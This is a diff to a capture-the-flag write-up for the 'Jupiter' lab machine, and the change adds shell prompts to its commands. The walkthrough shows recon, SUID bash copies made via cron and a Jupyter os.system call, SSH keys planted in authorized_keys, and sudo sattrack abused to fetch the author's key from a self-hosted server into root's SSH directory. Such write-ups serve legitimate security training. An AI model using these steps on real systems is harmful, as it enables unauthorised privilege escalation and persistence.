@@ -18,8 +18,8 @@ Jupiter is a medium Linux box at `10.10.11.216` and a long chain: five identitie
 ## recon
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.216
-nmap -p 22,80 -sCV 10.10.11.216
+$ nmap -p- --min-rate 10000 10.10.11.216
+$ nmap -p 22,80 -sCV 10.10.11.216
 ```
 
 ```
@@ -32,7 +32,7 @@ PORT   STATE SERVICE VERSION
 I added `jupiter.htb` to `/etc/hosts`. The root site was a static space-themed page; directory busting only turned up the usual `/img`, `/css`, `/js`, `/fonts`. The vhost was the lead, so I fuzzed subdomains, filtering the 178-byte redirect response that every miss returned:
 
 ```bash
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   -H "Host: FUZZ.jupiter.htb" -u http://jupiter.htb -fs 178
 ```
 
@@ -155,16 +155,16 @@ hosts:
 When the cron fired, `/tmp/bash` was a SUID copy owned by juno. `-p` keeps the privileges:
 
 ```bash
-/tmp/bash -p
-id
+$ /tmp/bash -p
+$ id
 # uid=114(postgres) ... euid=1000(juno)
 ```
 
 From that juno-euid shell I appended my public key to juno's `authorized_keys` and logged in cleanly for a stable session:
 
 ```bash
-echo 'ssh-rsa AAAA... uncle_j4ck@Farm' >> /home/juno/.ssh/authorized_keys
-ssh juno@10.10.11.216
+$ echo 'ssh-rsa AAAA... uncle_j4ck@Farm' >> /home/juno/.ssh/authorized_keys
+$ ssh juno@10.10.11.216
 ```
 
 juno owned `user.txt`.
@@ -191,7 +191,7 @@ juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-06-10-02.log
 (An older log had a stale token that no longer worked, so the date matters.) I forwarded the port over my SSH session and browsed in with the token:
 
 ```bash
-ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
+$ ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
 # then http://localhost:8888/?token=6eaf64d92fea64f9718f44fdbb711d6022208c4b2791d742
 ```
 
@@ -211,9 +211,9 @@ import os; os.system("cp /bin/bash /tmp/loull; chmod u+s /tmp/loull")
 It returned 0, so I ran the copy and dropped my key for a real shell:
 
 ```bash
-/tmp/loull -p   # euid jovian
+$ /tmp/loull -p   # euid jovian
 # append my key to /home/jovian/.ssh/authorized_keys
-ssh jovian@10.10.11.216
+$ ssh jovian@10.10.11.216
 ```
 
 ## root
@@ -280,15 +280,15 @@ I pointed the write at root's SSH directory and hosted my public key as `authori
 With `python3 -m http.server 8000` serving my `authorized_keys`:
 
 ```bash
-cp /tmp/config.json /tmp/config.json   # in place
-sudo sattrack
+$ cp /tmp/config.json /tmp/config.json   # in place
+$ sudo sattrack
 ```
 
 It downloaded my key straight into `/root/.ssh/authorized_keys`. SSH as root:
 
 ```bash
-ssh root@10.10.11.216
-cat /root/root.txt
+$ ssh root@10.10.11.216
+$ cat /root/root.txt
 ```
 
 The same primitive reads root-only files too. Pointing `tlesources` at a path relative to `tleroot` and reading the result back lets you exfil arbitrary files, for example dropping `/root/root.txt` somewhere readable:
